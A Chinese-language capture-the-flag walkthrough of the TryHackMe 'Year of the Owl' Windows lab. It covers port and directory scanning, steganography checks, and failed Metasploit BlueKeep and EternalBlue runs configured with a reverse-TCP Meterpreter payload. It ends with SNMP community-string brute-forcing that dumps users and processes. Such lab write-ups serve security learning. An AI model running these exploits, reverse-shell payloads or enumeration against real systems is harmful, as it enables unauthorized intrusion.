
## 題目 - Year of the Owl
- 來源: [tryhackme](https://tryhackme.com/room/yearoftheowl)
- 難度: hard
- 靶機: `10.10.251.239` `10.10.3.171`
> 因為靶機有重啟過，所以有多個 IP 
> 但攻擊過程都以 `owl.thm` 為 target

## Service Enumeration

### Ports Scan

```bash
nmap -sV -sC -v owl.thm 

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Year of the Owl
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.46 (OpenSSL/1.1.1g PHP/7.4.10)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-title: Year of the Owl
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB 10.3.24 or later (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: YEAR-OF-THE-OWL
|   NetBIOS_Domain_Name: YEAR-OF-THE-OWL
|   NetBIOS_Computer_Name: YEAR-OF-THE-OWL
|   DNS_Domain_Name: year-of-the-owl
|   DNS_Computer_Name: year-of-the-owl
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-31T01:41:06+00:00
| ssl-cert: Subject: commonName=year-of-the-owl
| Issuer: commonName=year-of-the-owl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-30T01:27:25
| Not valid after:  2026-05-01T01:27:25
| MD5:   673d:e129:f2f0:1131:c025:8413:bddb:a0a9
|_SHA-1: b40b:0cd5:fd2c:f0f2:2a6f:a0b7:b559:d0d7:c7ae:4893
|_ssl-date: 2025-10-31T01:41:40+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-31T01:41:07
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```


### feroxbuster
```bash
└─$ feroxbuster -u http://owl.thm -w ~/wordlists/directories.txt -t 100 -C 404 

                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://owl.thm/
 🚩  In-Scope Url          │ owl.thm
 🚀  Threads               │ 100
 📖  Wordlist              │ /home/kali/wordlists/directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       30w      297c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       33w      294c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       10l       18w      149c http://owl.thm/style.css
200      GET       11l       22w      252c http://owl.thm/
503      GET       11l       44w      397c http://owl.thm/examples
403      GET       11l       47w      416c http://owl.thm/licenses
403      GET       11l       47w      416c http://owl.thm/server-info
403      GET       11l       47w      416c http://owl.thm/server-status
[####################] - 44s     9501/9501    0s      found:6       errors:203    
```

### jpg check
#### exiftool
查看 EXIF 資料
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ exiftool owl.jpg 
ExifTool Version Number         : 13.25
File Name                       : owl.jpg
Directory                       : .
File Size                       : 130 kB
File Modification Date/Time     : 2020:09:18 08:38:04+08:00
File Access Date/Time           : 2025:10:31 12:23:08+08:00
File Inode Change Date/Time     : 2025:10:31 12:23:00+08:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1920
Image Height                    : 1280
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1920x1280
Megapixels                      : 2.5
```
#### strings
檢查隱寫術
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ strings owl.jpg | grep -i "flag\|password\|user\|hint"
                                                                            
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ 
```

#### binwalk
使用 binwalk 尋找隱藏文件
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ binwalk owl.jpg              

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
61420         0xEFEC          JBOOT STAG header, image id: 0, timestamp 0x3308AA3F, image size: 1020261372 bytes, image JBOOT checksum: 0xD0F0, header JBOOT checksum: 0x8910

                                                                            
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ binwalk -e owl.jpg           

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
```

#### steghide
嘗試 steghide 
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ steghide info owl.jpg  
"owl.jpg":
  format: jpeg
  capacity: 8.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!

┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ steghide extract -sf owl.jpg  
Enter passphrase: 
steghide: could not extract any data with that passphrase!

```

### smb check
#### enum4linux
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ enum4linux -a owl.thm
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Oct 31 11:12:01 2025

 =========================================( Target Information )=========================================                                               
                                                                            
Target ........... owl.thm                                                  
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==============================( Enumerating Workgroup/Domain on owl.thm )==============================                                                
                                                                            
                                                                            
[E] Can't find workgroup/domain                                             
                                                                            
                                                                            

 ==================================( Nbtstat Information for owl.thm )==================================                                                
                                                                            
Looking up status of 10.10.251.239                                          
No reply from 10.10.251.239

 ======================================( Session Check on owl.thm )======================================                                               
                                                                            
                                                                            
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.               
```

#### smbclient
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ smbclient -L \\\\owl.thm -N    
session setup failed: NT_STATUS_ACCESS_DENIED

┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ smbclient \\\\owl.thm\\share_name -U "" -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

#### smbmap
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ smbmap -H owl.thm    

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                              [|] Checking for open ports...                                              [/] Checking for open ports...                                              [-] Checking for open ports...                                              [\] Checking for open ports...                                              [|] Checking for open ports...                                              [/] Checking for open ports...                                              [-] Checking for open ports...                                              [\] Checking for open ports...                                              [|] Checking for open ports...                                              [*] Detected 0 hosts serving SMB                      
[/] Authenticating...                                                       [-] Closing connections..                                                   [\] Closing connections..                                                   [|] Closing connections..                                                   [/] Closing connections..                                                   [-] Closing connections..                                                                                                                               [*] Closed 0 connections
                                                                            
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ smbmap -H owl.thm -u guest

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                              [|] Checking for open ports...                                              [/] Checking for open ports...                                              [-] Checking for open ports...                                              [\] Checking for open ports...                                              [|] Checking for open ports...                                              [/] Checking for open ports...                                              [-] Checking for open ports...                                              [\] Checking for open ports...                                              [|] Checking for open ports...                                              [*] Detected 0 hosts serving SMB                      
[/] Initializing hosts...                                                   [-] Closing connections..                                                   [\] Closing connections..                                                   [|] Closing connections..                                                   [/] Closing connections..                                                   [-] Closing connections..                                                                                                                               [*] Closed 0 connections
```

### mysql
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ mysql -h owl.thm -u root    
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host 'ip-10-4-11-38.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
```

### cve-2019-0708
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show options

Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to
                                               report during connect
   RDP_CLIENT_NAME  ethdev           no        The client computer name to
                                                report during connect, UNS
                                               ET = random
   RDP_DOMAIN                        no        The client domain name to r
                                               eport during connect
   RDP_USER                          no        The username to report duri
                                               ng connect, UNSET = random
   RHOSTS           10.10.3.171      yes       The target host(s), see htt
                                               ps://docs.metasploit.com/do
                                               cs/using-metasploit/basics/
                                               using-metasploit.html
   RPORT            3389             yes       The target port (TCP)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh,
                                         thread, process, none)
   LHOST     10.4.11.38       yes       The listen address (an interface m
                                        ay be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic targeting via fingerprinting

msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run
[*] Started reverse TCP handler on 10.4.11.38:4444 
[*] 10.10.3.171:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 10.10.3.171:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[*] 10.10.3.171:3389      - Scanned 1 of 1 hosts (100% complete)
[-] 10.10.3.171:3389 - Exploit aborted due to failure: not-vulnerable: The target is not exploitable. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.

```
> google `cve_2019_0708` 可找到 [官方](https://support.microsoft.com/zh-tw/topic/關於-cve-2019-0708-的客戶指引-遠端桌面服務遠端執行程式碼弱點-2019-年-5-月-14-日-0624e35b-5f5d-6da7-632c-27066a79262e) 列出的影響範圍


### EternalBlue (MS17-010)
檢查 EternalBlue 漏洞 (MS17-010)
#### nmap scan
```bash
└─$ nmap --script smb-vuln-ms17-010 -p445 owl.thm    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 11:17 CST
Nmap scan report for owl.thm (10.10.251.239)
Host is up (0.63s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 3.52 seconds

```
#### msfconsole
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         owl.thm          yes       The target host(s), see https
                                             ://docs.metasploit.com/docs/u
                                             sing-metasploit/basics/using-
                                             metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain
                                              to use for authentication. O
                                             nly affects Windows Server 20
                                             08 R2, Windows 7, Windows Emb
                                             edded Standard 7 target machi
                                             nes.
   SMBPass                         no        (Optional) The password for t
                                             he specified username
   SMBUser                         no        (Optional) The username to au
                                             thenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture
                                             matches exploit Target. Only
                                             affects Windows Server 2008 R
                                             2, Windows 7, Windows Embedde
                                             d Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches ex
                                             ploit Target. Only affects Wi
                                             ndows Server 2008 R2, Windows
                                              7, Windows Embedded Standard
                                              7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh,
                                         thread, process, none)
   LHOST     10.4.11.38       yes       The listen address (an interface m
                                        ay be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.4.11.38:4444 
[*] 10.10.3.171:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 10.10.3.171:445       - An SMB Login Error occurred while connecting to the IPC$ tree.
[*] 10.10.3.171:445       - Scanned 1 of 1 hosts (100% complete)
[-] 10.10.3.171:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.

```

> nmap 掃出 `Product_Version: 10.0.17763`
> 可到此網站 https://msrc.microsoft.com/update-guide
> 搜尋 `10.0.17763` 即可確認對應 windows版本
> google `ms17-010` 可找到 [官方漏洞版本清單](https://learn.microsoft.com/zh-tw/security-updates/securitybulletins/2017/ms17-010#security-update-for-microsoft-windows-smb-server-4013389)
> 可發現靶機環境是 windows 10 1809 & windows server 2019
> 與官方的漏洞清單 windows 10 2016 & windows server 2016 
> 靶機的版本較新應該以修補此漏洞了

## Initial Access
### SNMP
#### onesixtyone 
```bash
└─$ onesixtyone 10.10.3.171 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt

Scanning 1 hosts, 3218 communities
10.10.3.171 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```
發現 `openview`

#### snmp-check
```bash
└─$ snmp-check -c openview 10.10.3.171 > snmpcheck_openview.txt

└─$ cat snmpcheck_openview.txt                         
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.3.171:161 using SNMPv1 and community 'openview'

[*] System information:

  Host IP address               : 10.10.3.171
  Hostname                      : year-of-the-owl
  Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
  Contact                       : -
  Location                      : -
  Uptime snmp                   : 01:18:57.53
  Uptime system                 : 01:18:06.65
  System date                   : 2025-10-31 04:46:26.3
  Domain                        : WORKGROUP

[*] User accounts:

  Guest               
  Jareth              
  Administrator       
  DefaultAccount      
  WDAGUtilityAccount  

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 128
  TCP segments received         : 6443
  TCP segments sent             : 6137
  TCP segments retrans          : 496
  Input datagrams               : 10212
  Delivered datagrams           : 10297
  Output datagrams              : 7178

[*] Network interfaces:

  Interface                     : [ up ] Software Loopback Interface 1
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 1073 Mbps
  MTU                           : 1500
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft 6to4 Adapter
  Id                            : 2
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft IP-HTTPS Platform Adapter
  Id                            : 3
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft Kernel Debug Network Adapter
  Id                            : 4
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Intel(R) 82574L Gigabit Network Connection
  Id                            : 5
  Mac Address                   : 00:0c:29:02:45:89
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft Teredo Tunneling Adapter
  Id                            : 6
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] AWS PV Network Device #0
  Id                            : 7
  Mac Address                   : 02:0f:74:a6:60:8d
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 1499730
  Out octets                    : 2925209

  Interface                     : [ up ] AWS PV Network Device #0-WFP Native MAC Layer LightWeight Filter-0000
  Id                            : 8
  Mac Address                   : 02:0f:74:a6:60:8d
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 1499730
  Out octets                    : 2925209

  Interface                     : [ up ] AWS PV Network Device #0-QoS Packet Scheduler-0000
  Id                            : 9
  Mac Address                   : 02:0f:74:a6:60:8d
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 1499730
  Out octets                    : 2925209

  Interface                     : [ up ] AWS PV Network Device #0-WFP 802.3 MAC Layer LightWeight Filter-0000
  Id                            : 10
  Mac Address                   : 02:0f:74:a6:60:8d
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 1499730
  Out octets                    : 2925209


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  7                     10.10.3.171           255.255.0.0           1                   
  1                     127.0.0.1             255.0.0.0             1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               10.10.0.1             0.0.0.0               25                  
  10.10.0.0             10.10.3.171           255.255.0.0           281                 
  10.10.3.171           10.10.3.171           255.255.255.255       281                 
  10.10.255.255         10.10.3.171           255.255.255.255       281                 
  127.0.0.0             127.0.0.1             255.0.0.0             331                 
  127.0.0.1             127.0.0.1             255.255.255.255       331                 
  127.255.255.255       127.0.0.1             255.255.255.255       331                 
  169.254.169.123       10.10.0.1             255.255.255.255       50                  
  169.254.169.249       10.10.0.1             255.255.255.255       50                  
  169.254.169.250       10.10.0.1             255.255.255.255       50                  
  169.254.169.251       10.10.0.1             255.255.255.255       50                  
  169.254.169.253       10.10.0.1             255.255.255.255       50                  
  169.254.169.254       10.10.0.1             255.255.255.255       50                  
  224.0.0.0             127.0.0.1             240.0.0.0             331                 
  255.255.255.255       127.0.0.1             255.255.255.255       331                 

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               135                   0.0.0.0               0                     listen              
  0.0.0.0               443                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              
  0.0.0.0               3306                  0.0.0.0               0                     listen              
  0.0.0.0               3389                  0.0.0.0               0                     listen              
  0.0.0.0               5985                  0.0.0.0               0                     listen              
  0.0.0.0               47001                 0.0.0.0               0                     listen              
  0.0.0.0               49664                 0.0.0.0               0                     listen              
  0.0.0.0               49665                 0.0.0.0               0                     listen              
  0.0.0.0               49666                 0.0.0.0               0                     listen              
  0.0.0.0               49667                 0.0.0.0               0                     listen              
  0.0.0.0               49668                 0.0.0.0               0                     listen              
  0.0.0.0               49670                 0.0.0.0               0                     listen              
  10.10.3.171           139                   0.0.0.0               0                     listen              
  10.10.3.171           49866                 74.178.76.128         443                   synSent             

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               123                 
  0.0.0.0               161                 
  0.0.0.0               3389                
  0.0.0.0               5353                
  0.0.0.0               5355                
  10.10.3.171           137                 
  10.10.3.171           138                 
  127.0.0.1             50492               

[*] Network services:

  Index                 Name                
  0                     Power               
  1                     mysql               
  2                     Server              
  3                     Themes              
  4                     SysMain             
  5                     Apache2.4           
  6                     IP Helper           
  7                     DNS Client          
  8                     DHCP Client         
  9                     Time Broker         
  10                    Workstation         
  11                    SNMP Service        
  12                    User Manager        
  13                    Windows Time        
  14                    CoreMessaging       
  15                    Plug and Play       
  16                    Print Spooler       
  17                    Task Scheduler      
  18                    Windows Update      
  19                    Amazon SSM Agent    
  20                    CNG Key Isolation   
  21                    COM+ Event System   
  22                    Windows Event Log   
  23                    IPsec Policy Agent  
  24                    Group Policy Client 
  25                    RPC Endpoint Mapper 
  26                    Web Account Manager 
  27                    AWS Lite Guest Agent
  28                    Data Sharing Service
  29                    Device Setup Manager
  30                    Network List Service
  31                    System Events Broker
  32                    User Profile Service
  33                    Base Filtering Engine
  34                    Local Session Manager
  35                    TCP/IP NetBIOS Helper
  36                    Cryptographic Services
  37                    Application Information
  38                    Certificate Propagation
  39                    Remote Desktop Services
  40                    Shell Hardware Detection
  41                    Diagnostic Policy Service
  42                    Network Connection Broker
  43                    Security Accounts Manager
  44                    Windows Defender Firewall
  45                    Network Location Awareness
  46                    Windows Connection Manager
  47                    Windows Font Cache Service
  48                    Remote Procedure Call (RPC)
  49                    Update Orchestrator Service
  50                    User Access Logging Service
  51                    DCOM Server Process Launcher
  52                    Remote Desktop Configuration
  53                    Windows Update Medic Service
  54                    Network Store Interface Service
  55                    Client License Service (ClipSVC)
  56                    Distributed Link Tracking Client
  57                    System Event Notification Service
  58                    Connected Devices Platform Service
  59                    Windows Defender Antivirus Service
  60                    Windows Management Instrumentation
  61                    Distributed Transaction Coordinator
  62                    Microsoft Account Sign-in Assistant
  63                    Background Tasks Infrastructure Service
  64                    Program Compatibility Assistant Service
  65                    Connected User Experiences and Telemetry
  66                    WinHTTP Web Proxy Auto-Discovery Service
  67                    Windows Push Notifications System Service
  68                    Windows Remote Management (WS-Management)
  69                    Remote Desktop Services UserMode Port Redirector
  70                    Windows Defender Antivirus Network Inspection Service

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     running               System Idle Process                                             
  4                     running               System                                                          
  68                    running               Registry                                                        
  408                   running               smss.exe                                                        
  488                   running               dwm.exe                                                         
  572                   running               csrss.exe                                                       
  636                   running               svchost.exe           C:\Windows\system32\  -k netsvcs -p       
  644                   running               csrss.exe                                                       
  664                   running               wininit.exe                                                     
  708                   running               winlogon.exe                                                    
  764                   running               svchost.exe           C:\Windows\System32\  -k LocalSystemNetworkRestricted -p
  772                   running               services.exe                                                    
  788                   running               lsass.exe             C:\Windows\system32\                      
  852                   running               svchost.exe           C:\Windows\System32\  -k termsvcs         
  888                   running               svchost.exe           C:\Windows\system32\  -k DcomLaunch -p    
  912                   running               fontdrvhost.exe                                                 
  920                   running               fontdrvhost.exe                                                 
  984                   running               svchost.exe           C:\Windows\system32\  -k RPCSS -p         
  1044                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted -p
  1216                  running               svchost.exe           C:\Windows\system32\  -k LocalService -p  
  1276                  running               amazon-ssm-agent.exe  C:\Program Files\Amazon\SSM\                      
  1296                  running               svchost.exe           C:\Windows\System32\  -k NetworkService -p
  1320                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNetworkRestricted -p
  1468                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetwork -p
  1476                  running               LiteAgent.exe         C:\Program Files\Amazon\XenTools\                      
  1496                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetworkFirewall -p
  1564                  running               httpd.exe             C:\xampp\apache\bin\  -k runservice       
  1748                  running               svchost.exe           C:\Windows\system32\  -k netsvcs          
  1856                  running               spoolsv.exe           C:\Windows\System32\                      
  1888                  running               httpd.exe             C:\xampp\apache\bin\  -d C:/xampp/apache  
  1904                  running               svchost.exe           C:\Windows\System32\  -k utcsvc -p        
  1956                  running               msdtc.exe             C:\Windows\System32\                      
  1992                  running               svchost.exe           C:\Windows\system32\  -k LocalService     
  2028                  running               snmp.exe              C:\Windows\System32\                      
  2040                  running               MsMpEng.exe                                                     
  2104                  running               mysqld.exe            C:\xampp\mysql\bin\   --defaults-file=c:\xampp\mysql\bin\my.ini mysql
  2124                  running               svchost.exe           C:\Windows\System32\  -k smbsvcs          
  2224                  running               CompatTelRunner.exe   C:\Windows\system32\  -maintenance        
  2312                  running               conhost.exe           \??\C:\Windows\system32\  0x4                 
  2324                  running               svchost.exe           C:\Windows\system32\  -k NetworkServiceNetworkRestricted -p
  3016                  running               LogonUI.exe                                 /flags:0x2 /state0:0xa3a7d055 /state1:0x41c64e6d
  3816                  running               CompatTelRunner.exe   C:\Windows\system32\  -m:appraiser.dll -f:DoScheduledTelemetryRun -cv:n/Eyeocc1UOB9xeF.2
  4000                  running               NisSrv.exe                                                      
  4896                  running               WmiPrvSE.exe          C:\Windows\system32\wbem\                      
  5040                  running               svchost.exe                                                     
  5104                  running               svchost.exe                                                     

[*] Storage information:

  Description                   : ["C:\\ Label:  Serial Number 7c0c3814"]
  Device id                     : [#<SNMP::Integer:0x0000ffff89fa1570 @value=1>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x0000ffff89c8fcd8 @value=4096>]
  Memory size                   : 19.46 GB
  Memory used                   : 14.40 GB

  Description                   : ["Virtual Memory"]
  Device id                     : [#<SNMP::Integer:0x0000ffff89c8b098 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x0000ffff89c89568 @value=65536>]
  Memory size                   : 3.12 GB
  Memory used                   : 1.07 GB

  Description                   : ["Physical Memory"]
  Device id                     : [#<SNMP::Integer:0x0000ffff89c84b30 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x0000ffff89c83050 @value=65536>]
  Memory size                   : 2.00 GB
  Memory used                   : 1.04 GB


[*] File system information:

  Index                         : 1
  Mount point                   : 
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 0

[*] Device information:

  Id                    Type                  Status                Descr               
  1                     unknown               running               Microsoft XPS Document Writer v4
  2                     unknown               running               Microsoft Print To PDF
  3                     unknown               running               Unknown Processor Type
  4                     unknown               unknown               Software Loopback Interface 1
  5                     unknown               unknown               Microsoft 6to4 Adapter
  6                     unknown               unknown               Microsoft IP-HTTPS Platform Adapter
  7                     unknown               unknown               Microsoft Kernel Debug Network Adapter
  8                     unknown               unknown               Intel(R) 82574L Gigabit Network Connection
  9                     unknown               unknown               Microsoft Teredo Tunneling Adapter
  10                    unknown               unknown               AWS PV Network Device #0
  11                    unknown               unknown               AWS PV Network Device #0-WFP Native MAC Layer LightWeight Filter
  12                    unknown               unknown               AWS PV Network Device #0-QoS Packet Scheduler-0000
  13                    unknown               unknown               AWS PV Network Device #0-WFP 802.3 MAC Layer LightWeight Filter-
  14                    unknown               running               Fixed Disk          
  15                    unknown               running               Fixed Disk          
  16                    unknown               running               IBM enhanced (101- or 102-key) keyboard, Subtype=(0)
  17                    unknown               unknown               COM1:               

[*] Software components:

  Index                 Name                
  1                     XAMPP               
  2                     Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.11.25325
  3                     Microsoft Visual C++ 2017 x64 Additional Runtime - 14.11.25325
  4                     Amazon SSM Agent    
  5                     Amazon SSM Agent    
  6                     Microsoft Visual C++ 2017 Redistributable (x64) - 14.11.25325

```

#### snmpwalk
也可以透過 snmpwalk 取得 users
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ snmpwalk -v2c -c openview 10.10.3.171 1.3.6.1.4.1.77.1.2.25 
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
